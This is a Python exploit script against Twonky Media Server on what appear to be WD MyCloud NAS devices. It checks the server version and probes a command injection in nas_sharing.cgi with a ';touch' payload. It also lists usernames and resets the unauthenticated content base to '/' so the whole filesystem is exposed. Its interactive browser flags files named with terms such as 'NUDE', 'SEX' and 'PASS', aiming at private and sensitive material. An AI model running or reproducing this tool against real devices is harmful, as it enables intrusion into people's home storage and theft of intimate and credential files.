import requests
import sys
from colorama import init, Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

#pip install requests[security]
#pip instal colorama
def detector(line):
	keywords = ["XXX", "NUDE", "BOOB", "PUSSY", "DICK", "SEX", "HOT", "EXPENSES",
				"PASS", "PRETTY", "SCHATZI"]
	for keyword in keywords:
		if line.upper().find(keyword) != -1:
			return True
	return False

def discovery(headers):
	while True:
		var = raw_input("path nr: ")
		if var != "exit" and var != "exploit":
			url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/dir/path=" + var
			
			try:
				response = requests.get(url)
				print "-" * 30
				for line in response.iter_lines():
					if line :
						if len(line) > 3:
							if line[3] == "D":
								line = line[:4].replace("D", " D ") + line[4:]
								if detector(line[4:]):
									print (Fore.RED + line)
								else:
									print (Fore.GREEN + line)
							elif line[3] == "F":
								line = line[:4].replace("F", " F ") + line[4:]
								if detector(line[4:]):
									print (Fore.RED + line)
								else:
									print line
							else:
								print line
				print "-" * 30
			except:
				print "*** Error occured ***"
				sys.exit()
		elif var == "exploit":
			payload = "\nfriendlyname=WDMyCloud\n"
			url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/set_all"
			response = requests.post(url, data=payload, headers=headers)
			if response.status_code != 200:
				print (Fore.RED + "*** Error status_code = " + str(response.status_code))
		elif var == "exit":
			sys.exit()


if len(sys.argv) != 3:
	print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
else:
	headers = {"Host" : "%s:%s"%(sys.argv[1],sys.argv[2]),
	"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0",
	"Accept" : "*/*",
	"Accept-Language" : "de,en-US;q=0.7,en;q=0.3",
	"Accept-Encoding" : "gzip, deflate",
	"Referer" : "http://%s:%s/"%(sys.argv[1],sys.argv[2]),
	"Content-Type" : "application/x-www-form-urlencoded",
	"X-Requested-With" : "XMLHttpRequest",}
	
	try:
		#Get Servername and Version
		print (Fore.MAGENTA + "*** Get Servername and Twonky Version ***")
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/get_friendlyname"
		friendlyname = requests.get(url, headers=headers)
		if friendlyname.status_code == 200:
			print (Fore.GREEN + "Server Name: %s"%friendlyname.text)
		else:
			print (Fore.RED + "*** Not authorized to access settings ***")
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/info_status"
		version = requests.get(url, headers=headers)
		for line in version.iter_lines():
					if line :
						if line.find("version") != -1:
							lineSplited = line.split("|")
							versionNumber = lineSplited[1]
							if versionNumber == "8.2.1":
								print (Fore.RED + "*** Version 8.2.1 detected not vulnerable ***")
								sys.exit()
							print (Fore.GREEN + "Twonky Version: %s \n"%versionNumber)
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/info_status"
	except:
		print (Fore.RED + "*** Error while initializing ***")
		sys.exit()
	try:
		print (Fore.MAGENTA + "*** Check for open ports and vulns ***")
		url = "http://" + str(sys.argv[1]) + ":80" + "/"
		webservices =  requests.get(url, headers=headers)
		if webservices.status_code == 200:
			# Check if UI is accessable
			if webservices.text.find("/UI") != -1:
				url = "http://" + str(sys.argv[1]) + ":80" + "/UI"
				uiAccess =  requests.get(url, headers=headers)
				print uiAccess
				if uiAccess.status_code == 200:
					print (Fore.GREEN + "*** UI access available! ***")
				else:
					print (Fore.YELLOW + "*** UI access restricted ***")
			print (Fore.GREEN + "*** Port 80 available ***")
			# Check if system is vulnerable for remote code execution
			url = "http://" + str(sys.argv[1]) + ":80" + "/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&start=1&count=1;touch+/tmp/XXX"
			cgiSharing =  requests.get(url, headers=headers)
			if cgiSharing.status_code != 404:
				print (Fore.GREEN + str(cgiSharing.status_code))
			else:
				print (Fore.YELLOW + "*** System not vulnerable for Remote Code execution ***")
			#Get usernames
			url = "http://" + str(sys.argv[1]) + ":80" + "/api/2.1/rest/users?"
			usernames =  requests.get(url, headers=headers)
			if usernames.status_code == 200:
				print (Fore.GREEN + "Usernames discovered: %s"%usernames.text)
			else:
				print (Fore.YELLOW + "*** No Usernames found! ***")
		else:
			print (Fore.YELLOW + "*** Port 80 unavailable ***")
			url = "https://" + str(sys.argv[1]) + ":443" + "/"
			webservices =  requests.get(url, headers=headers, verify=False)
			if webservices.status_code == 200:
				print (Fore.GREEN + "*** Port 443 available! ***")
			else:
				print (Fore.YELLOW + "*** Port 443 unavailable ***")
		
	except:
		print (Fore.RED + "*** Error while discovering webservices! ***")

	print (Fore.MAGENTA + "\n*** Starting Twonky File System Discovery mode ***")
	print (Fore.YELLOW + "First time connected to this Server?")
	set_contentbase = raw_input(Fore.YELLOW + "Set Content base to '/' default 'N'? [Y,N] ")
	if set_contentbase.upper() == "Y":
		payload = "\ncontentbase=/\n"
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/set_all"
		response = requests.post(url, data=payload, headers=headers)
		if response.status_code != 200:
			print (Fore.RED + "*** Error status_code = " + str(response.status_code))
		else:
			discovery(headers)
	else:
		discovery(headers)
